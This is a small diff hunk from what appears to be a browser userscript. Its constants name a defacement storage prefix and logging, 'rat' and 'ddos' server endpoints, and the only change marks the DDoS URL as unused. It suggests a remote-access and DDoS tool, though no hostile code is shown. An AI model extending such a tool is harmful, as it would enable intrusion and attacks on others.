@@ -24,7 +24,7 @@
     const storageKeyPrefix = 'noodles_defacement_';
     const logServerURL = 'http://noodles.local/logs';
     const ratServerURL = 'http://noodles.local/rat';
-    const ddosServerURL = 'http://noodles.local/ddos';
+    const ddosServerURL = 'http://noodles.local/ddos'; //unused
     const heartbeatInterval = 60000;
     let sessionID = GM_getValue(storageKeyPrefix + 'sessionID', null);
 
